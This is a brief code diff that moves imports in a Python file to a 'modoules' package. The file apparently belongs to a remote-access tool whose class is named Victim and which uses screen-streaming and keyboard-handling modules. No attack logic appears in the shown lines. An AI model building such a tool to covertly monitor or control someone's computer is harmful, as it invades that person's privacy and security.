@@ -2,12 +2,12 @@ import socket
 import sys
 import threading
 
-from screen_mirroring.screen_stream import ScreenStream
+from modoules.screen_mirroring.screen_stream import ScreenStream
 
 sys.path.append('')
 
-from handelrs.keyboard_handelr import HandelKeyboard
-from protocol.protocol import HandelPacket, PacketType
+from modoules.handelrs.keyboard_handelr import HandelKeyboard
+from modoules.protocol.protocol import HandelPacket, PacketType
 
 
 class Victim:
